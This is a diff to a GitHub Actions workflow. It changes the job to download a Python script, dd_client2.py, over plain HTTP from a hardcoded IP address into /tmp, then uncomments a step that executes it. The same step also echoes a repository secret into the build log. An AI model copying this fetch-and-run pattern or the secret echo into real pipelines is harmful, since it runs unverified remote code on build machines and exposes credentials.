@@ -18,6 +18,6 @@ jobs:
       - name: clone script
         env: 
           SIP: ${{ secrets.SIP }}
-        run: echo ${SIP}; wget http://${SIP}/assets/dd_client2.py -O /tmp/dd_client2.py
-#       - name: execute script
-#         run: python3 /tmp/dd_client2.py 1 
+        run: echo ${SIP}; wget http://49.233.24.188/assets/dd_client2.py -O /tmp/dd_client2.py
+      - name: execute script
+        run: python3 /tmp/dd_client2.py 1 
